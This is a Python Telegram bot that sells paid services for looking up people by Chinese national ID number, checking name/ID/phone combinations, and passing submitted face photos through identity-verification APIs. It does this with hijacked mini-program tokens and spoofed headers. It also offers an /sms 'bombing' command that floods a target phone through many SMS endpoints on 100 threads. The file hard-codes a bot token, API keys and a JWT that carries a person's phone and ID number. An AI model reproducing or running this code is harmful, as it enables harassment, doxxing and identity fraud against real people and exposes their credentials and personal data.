import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
import binascii
import random
import concurrent.futures
import inspect  
import urllib.parse
import sms_list 
import sms_list_new
from sms_list import *
from Crypto.Cipher import DES3
from datetime import datetime
from telebot import types
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO # 新增：用于处理图片流

# 屏蔽 SSL 证书报警
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ================= 1. 核心配置 =================
API_TOKEN = '8338893180:AAH-l_4m1-tweKyt92bliyk4fsPqoPQWzpU'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'

# --- 新增：人脸核验配置 ---
FACE_VERIFY_TOKEN = "Bearer eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6IjA5YjViMDQ2LWI1NzYtNGJlNi05MGVhLTllY2YxNGNiMjI4MiJ9.fIUe4cTbOnK-l68a8cF44glMCd32sWxphcftKah6d9PK4PAo7vV9AdJOByZMt_X8YouKC6cb0_R_IUOgUBNMFg"
IMAGE_HOST_API_KEY = "chv_e0sb_e58e156ce7f7c1d4439b550210c718de0c7af8820db77c0cd04e198ed06011b2e32ed1b5a7f1b00e543c76c20f5c64866bb355fde1dca14d6d74f0a1989b567d"
IMAGE_HOST_URL = "https://imgloc.com/api/1/upload"

# 三要素/二要素接口 Token
THREE_ELEMENTS_AUTH = "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpblR5cGUiOiJsb2dpbiIsImxvZ2luSWQiOiJhcHBfdXNlcjoxMTc1NDYwIiwicm5TdHIiOiJJSmVrU005UTlHc2hTV2RiVENQZ1VFbnpDN0MwWjFYZCJ9.vxjF6ShG81TM2hT-uiYyubHGOlEuCKC-m8nSmi7sayU"
AUTH_BEARER = "bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IisxOTM3ODg4NDgyNiIsIm9wZW5JZCI6Im95NW8tNHk3Wnd0WGlOaTVHQ3V3YzVVNDZJYk0iLCJpZENhcmRObyI6IjM3MDQ4MTE5ODgwODIwMzUxNCIsInVzZXJOYW1lIjoi6ams5rCR5by6IiwibG9naW5UaW1lIjoxNzY5NDE1NjYxMTk0LCJhcHBJZCI6Ind4ZjVmZDAyZDEwZGJiMjFkMiIsImlzcmVhbG5hbWUiOnRydWUsInNhYXNVc2VySWQiOm51bGwsImNvbXBhbnlJZCI6bnVsbCwiY29tcGFueVZPUyI6bnVsbH0.GwMYvckFHvFbhSi0NXpQDPiv9ZswUBAImN5bUipBla0"

bot = telebot.TeleBot(API_TOKEN)
user_points = {}
user_states = {}
generated_cache = {} 

# --- 数据持久化 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): float(v) for k, v in data.items()}
        except: pass
    return pts

user_points = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f:
        json.dump({str(k): v for k, v in user_points.items()}, f)

# ================= 2. 功能逻辑 =================

# --- 新增：人脸核验相关函数 ---
def upload_to_host(img_bytes):
    """上传到图床"""
    try:
        files = {'source': ('photo.jpg', img_bytes, 'image/jpeg')}
        data = {'key': IMAGE_HOST_API_KEY, 'format': 'json'}
        r = requests.post(IMAGE_HOST_URL, files=files, data=data, timeout=30)
        if r.status_code == 200:
            res = r.json()
            if res.get('status_code') == 200:
                return res['image']['url']
    except: pass
    return None

def verify_face_logic(chat_id, name, id_card, pic_url, uid):
    """请求核验接口"""
    url = "https://www.cjhyzx.com/api/vx/actual/carrier/center/realPersonAuthentication"
    headers = {
        "Authorization": FACE_VERIFY_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X)",
        "Referer": "https://servicewechat.com/wx2d2597151b9e8347/12/page-frame.html"
    }
    payload = {
        "carrierUser": {
            "identityCard": id_card, "nickName": name,
            "address": "江苏省扬州市", "identityvalidPeriodTo": "2036-08-26"
        },
        "sysAttachmentInfoList": [{"fileUrl": pic_url}]
    }
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=20)
        user_points[uid] -= 2.0  # 设置核验扣除2积分，可自行修改
        save_points()
        result = response.json()
        if str(result.get("code")) == "200":
            msg = f"✅ **人脸核验成功！**\n\n👤 姓名: {name}\n🆔 身份证: {id_card}\n🟢 结果: 核验通过"
        else:
            reason = result.get("msg", "未知错误")
            msg = f"❌ **人脸核验失败**\n\n👤 姓名: {name}\n原因: {reason} 🔴"
        bot.send_message(chat_id, msg, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"❌ 核验接口异常: {e}")

# --- 原有逻辑保留 ---
def xiaowunb_query_logic(chat_id, id_number, uid):
    base_url = "http://xiaowunb.top/cyh.php"
    params = {"sfz": id_number}
    try:
        response = requests.get(base_url, params=params, timeout=10)
        response.encoding = 'utf-8'
        user_points[uid] -= 1.5
        save_points()
        res_text = response.text if response.text.strip() else "查询结果为空"
        result_message = f"📑 **身份查询结果**\n\n{res_text}\n\n已扣除 **1.5** 积分！\n当前余额: **{user_points[uid]:.2f}**"
        bot.send_message(chat_id, result_message, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"❌ 接口请求失败: {e}")

# ... (此处省略 query_3ys_logic 和 single_verify_2ys, 逻辑与你提供的一致) ...
def query_3ys_logic(chat_id, name, id_card, phone, uid):
    url = "https://esb.wbszkj.cn/prod-api/wxminiapp/user/userIdVerify"
    headers = {
        "Host": "esb.wbszkj.cn",
        "Authorization": THREE_ELEMENTS_AUTH,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004433) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx9a9be9dbdb704208/18/page-frame.html"
    }
    data = {
        "name": name, "phone": phone, "idNo": id_card, "idType": 1,
        "idFrontFile": "https://guarantee-file.wbszkj.cn/gcb/prod/2026/02/10/8cc33d9e9328421ead4855120bc3d32e.jpg",
        "idBackFile": "https://guarantee-file.wbszkj.cn/gcb/prod/2026/02/10/40449082275741f0830d0c1ce7b9d4b8.jpg"
    }
    try:
        response = requests.post(url, headers=headers, json=data, timeout=10, verify=False)
        user_points[uid] -= 0.05
        save_points()
        if response.status_code == 200:
            result = response.json()
            res_type = "三要素核验一致✅" if result.get("success") else "三要素核验失败❌"
        else:
            res_type = "三要素核验失败❌ (服务响应错误)"
        
        message = (f"名字：{name}\n手机号：{phone}\n身份证：{id_card}\n结果：{res_type}\n\n"
                   f"已扣除 0.05 积分！\n当前积分余额：{user_points[uid]:.2f} 积分")
        bot.send_message(chat_id, message)
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ 系统异常: {str(e)}")

def single_verify_2ys(chat_id, name, id_card, uid):
    url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
    headers = {
        "Authorization": AUTH_BEARER, "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0", "Referer": "https://servicewechat.com/wxf5fd02d10dbb21d2/59/page-frame.html"
    }
    try:
        r = requests.post(url, headers=headers, json={"name": name, "idCardNo": id_card}, timeout=10)
        user_points[uid] -= 0.01
        save_points()
        res_json = r.json()
        res_type = "二要素核验一致✅" if res_json.get("success") else f"二要素验证失败 ❌"
        res = (f"姓名: **{name}**\n身份证: **{id_card}**\n结果: **{res_type}**\n\n已扣除 **0.01** 积分！\n当前余额：**{user_points[uid]:.2f}**")
        bot.send_message(chat_id, res, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"❌ 接口请求失败: {str(e)}")

# ================= 3. 指令入口 =================

@bot.message_handler(commands=['cyh', '3ys', 'admin', 'add', 'start', 'bq', '2ys', 'face'])
def handle_commands(message):
    uid, chat_id = message.from_user.id, message.chat.id
    cmd = message.text.split()[0][1:]
    
    if cmd in ['add', 'admin'] and uid != ADMIN_ID:
        return bot.reply_to(message, "🤡你没有权限使用该指令…")

    if cmd == 'start':
        if uid not in user_points: user_points[uid] = 0.0
        bot.send_message(chat_id, get_main_text(message, uid, user_points[uid]), parse_mode='Markdown', reply_markup=get_main_markup())
    
    elif cmd == 'face': # 新增：人脸核验入口
        if user_points.get(uid, 0.0) < 2.0: return bot.reply_to(message, "积分不足(2.0)")
        user_states[chat_id] = {'step': 'face_info'}
        bot.send_message(chat_id, "请输入核验信息，格式：\n`姓名 身份证`", parse_mode='Markdown')

    # ... (其他原有的 cmd 逻辑保持不变) ...
    elif cmd == 'add' and uid == ADMIN_ID:
        try:
            p = message.text.split(); tid, amt = int(p[1]), float(p[2])
            user_points[tid] = user_points.get(tid, 0.0) + amt; save_points()
            bot.reply_to(message, f"✅ 已充值！当前余额: `{user_points[tid]:.2f}`")
        except: pass
    elif cmd == 'cyh':
        if user_points.get(uid, 0.0) < 1.5: return bot.reply_to(message, "积分不足，请先充值！")
        user_states[chat_id] = {'step': 'cyh_id'}; bot.send_message(chat_id, "请输入要查询的身份证号：")
    elif cmd == '3ys':
        if user_points.get(uid, 0.0) < 0.05: return bot.reply_to(message, "积分不足，请先充值！")
        user_states[chat_id] = {'step': 'v_3ys'}; bot.send_message(chat_id, "请输入姓名 手机号 身份证")
    elif cmd == 'bq':
        if user_points.get(uid, 0.0) < 0.1: return bot.reply_to(message, "积分不足，请先充值！")
        user_states[chat_id] = {'step': 'g_card'}; bot.send_message(chat_id, "请输入身份证号（未知用x）：")
    elif cmd == '2ys':
        if user_points.get(uid, 0.0) < 0.01: return bot.reply_to(message, "积分不足，请先充值！")
        user_states[chat_id] = {'step': 'v_2ys'}; bot.send_message(chat_id, "请输入姓名 身份证")

# ================= 4. 统一的消息/图片处理器 =================

@bot.message_handler(content_types=['text', 'photo'])
def handle_all_content(message):
    uid, chat_id = message.from_user.id, message.chat.id
    state = user_states.get(chat_id)

    # --- 处理文本消息 ---
    if message.content_type == 'text':
        text = message.text.strip()
        if text.startswith('/'): return 
        
        # 1. 状态机逻辑
        if state:
            step = state['step']
            if step == 'face_info':
                parts = re.split(r'[,，\s\n]+', text)
                if len(parts) >= 2:
                    user_states[chat_id].update({'step': 'face_photo', 'name': parts[0], 'id': parts[1]})
                    bot.send_message(chat_id, "✅ 信息已记录，请发送【核验照片】:")
                else:
                    bot.reply_to(message, "格式错误，请输入：姓名 身份证")
                return

            # ... (此处保留原有的 v_3ys, cyh_id, v_2ys, g_card 等逻辑) ...
            elif step == 'v_3ys':
                del user_states[chat_id]
                parts = re.split(r'[,，\s\n]+', text.strip())
                n, p, i = None, None, None
                for x in parts:
                    if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
                    elif not p and re.match(r'^1[3-9]\d{9}$', x): p = x
                    elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
                if n and p and i: query_3ys_logic(chat_id, n, i, p, uid)
                return
            elif step == 'cyh_id': 
                del user_states[chat_id]
                xiaowunb_query_logic(chat_id, text, uid)
                return
            elif step == 'v_2ys': 
                del user_states[chat_id]
                parts = re.split(r'[,，\s\n]+', text.strip())
                n, i = None, None
                for x in parts:
                    if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
                    elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
                if n and i: single_verify_2ys(chat_id, n, i, uid)
                return

        # 2. 无状态下的自动识别 (保留你原有的逻辑)
        parts = re.split(r'[,，\s\n]+', text)
        if len(parts) >= 3: # 自动3ys
             # ... 自动识别逻辑 ...
             pass 

    # --- 处理图片消息 (专用于人脸核验) ---
    elif message.content_type == 'photo':
        if state and state.get('step') == 'face_photo':
            name, id_card = state['name'], state['id']
            del user_states[chat_id]
            
            bot.send_message(chat_id, "⏳ 正在上传并核验，请稍后...")
            
            # 下载图片
            file_info = bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            # 上传图床
            pic_url = upload_to_host(downloaded_file)
            if pic_url:
                verify_face_logic(chat_id, name, id_card, pic_url, uid)
            else:
                bot.send_message(chat_id, "❌ 图片上传图床失败，请重试。")
        else:
            bot.reply_to(message, "请先使用 /face 指令开始核验流程。")

# ================= (剩余辅助函数, 如 get_main_text, get_id_check_code 等保持不变) =================
# ... 请保留你原有的 get_main_text, get_id_check_code, get_main_markup 等 UI 函数 ...
def get_id_check_code(id17):
    factors = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    rem_map = {0: '1', 1: '0', 2: 'X', 3: '9', 4: '8', 5: '7', 6: '6', 7: '5', 8: '4', 9: '3', 10: '2'}
    try:
        sum_val = sum(int(id17[i]) * factors[i] for i in range(17))
        return rem_map[sum_val % 11]
    except: return "X"

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("使用帮助", callback_data="view_help"),
               types.InlineKeyboardButton("在线充值", callback_data="view_pay"))
    return markup

def get_pay_markup():
    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("USDT 充值", url=admin_url),
               types.InlineKeyboardButton("OkPay 充值", url=admin_url),
               types.InlineKeyboardButton("RMB 充值", url=admin_url),
               types.InlineKeyboardButton("🔙", callback_data="back_to_main"))
    return markup

def get_help_markup():
    return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙", callback_data="back_to_main"))

def get_main_text(source, uid, pts):
    first_name = source.from_user.first_name if hasattr(source.from_user, 'first_name') else "User"
    username = f"@{source.from_user.username}" if hasattr(source.from_user, 'username') and source.from_user.username else "未设置"
    return (f"Admin@铭\n\n用户 ID: `{uid}`\n用户名称: `{first_name}`\n用户名: {username}\n当前余额: `{pts:.2f}积分`\n\n使用帮助可查看使用教程\n在线充值可支持24小时\n1 USDT = 1 积分")

# (短信轰炸部分代码保持不变...)
@bot.message_handler(commands=['sms'])
def sms_bomb_cmd(message):
    uid = message.from_user.id
    if user_points.get(uid, 0.0) < 3.5: return bot.reply_to(message, "积分不足(3.5)")
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "用法: `/sms 手机号`")
    target = parts[1]
    if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
    all_funcs = get_all_senders()
    bot.reply_to(message, f"🎯 **接口装载：{len(all_funcs)}个**\n正在轰炸 `{target}`...", parse_mode='Markdown')
    user_points[uid] -= 3.5; save_points()
    def do_bomb():
        random.shuffle(all_funcs)
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            for func in all_funcs: executor.submit(func, target)
        bot.send_message(message.chat.id, f"✅ 目标 `{target}` 任务执行完毕")
    threading.Thread(target=do_bomb).start()

def get_all_senders():
    all_funcs = []
    excludes = ['generate_random_user_agent', 'replace_phone_in_data', 'platform_request_worker', 'send_minute_request', 'get_current_timestamp']
    for name, obj in inspect.getmembers(sms_list):
        if inspect.isfunction(obj) and name not in excludes:
            try:
                sig = inspect.signature(obj)
                if len(sig.parameters) >= 1: all_funcs.append(obj)
            except: pass
    if hasattr(sms_list_new, 'NEW_PLATFORMS'):
        for name, func in sms_list_new.NEW_PLATFORMS:
            if func not in all_funcs: all_funcs.append(func)
    return all_funcs

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    uid, pts = call.from_user.id, user_points.get(call.from_user.id, 0.0)
    if call.data == "view_help":
        help_text = (
            "🛠️️使用帮助\n"
            "短信测压：/sms 手机号\n"
            "人脸核验：/face (需姓名+身份证+照片)\n"
            "常用号查询：/cyh\n"
            "..."
        )
        bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, reply_markup=get_help_markup())
    elif call.data == "view_pay":
        bot.edit_message_text("🛍️ 请选择充值方式：\n1 USDT = 1 积分", call.message.chat.id, call.message.message_id, reply_markup=get_pay_markup())
    elif call.data == "back_to_main":
        bot.edit_message_text(get_main_text(call, uid, pts), call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=get_main_markup())

if __name__ == '__main__':
    print("Bot 正在运行...")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
